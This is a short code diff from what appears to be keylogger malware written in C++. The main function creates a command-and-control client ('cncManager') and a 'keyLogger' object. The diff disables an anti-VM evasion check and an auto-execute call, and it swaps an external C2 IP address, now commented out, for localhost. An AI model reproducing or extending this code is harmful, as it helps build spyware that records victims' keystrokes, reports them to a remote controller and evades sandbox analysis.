@@ -10,12 +10,13 @@
 
 //int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
 int main() {
-    //autoExecute();
     
-    /*if (Anti_VM()) {*/
+    //if (Anti_VM()) {
     if (true) {
-        cncManager client(L"1.251.227.66");
-        //cncManager client(L"127.0.0.1");
+        //autoExecute();
+        //cncManager client(L"1.251.227.66");
+
+        cncManager client(L"127.0.0.1");
 
         keyLogger logger;
 
